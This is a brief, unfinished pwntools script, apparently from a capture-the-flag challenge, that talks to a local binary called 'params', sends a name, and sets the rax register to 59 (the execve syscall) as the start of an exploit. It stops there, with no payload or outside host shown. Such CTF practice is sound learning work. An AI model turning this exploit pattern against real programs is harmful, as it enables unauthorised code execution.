#!/bin/python
from pwn import *
target = process("./params")

print(target.recvline()) # hey bb
print(target.recvline()) # whats ur name

target.sendline(b"louie") # dont think this matters, probobly wrong but start with assumption
print("louie")

print(target.recvline()) # hello $NAME
print(target.recvline()) # you can set my registers any day of the week

target.recvuntil(b"rax:")
target.sendline(b"59") # exec syscall

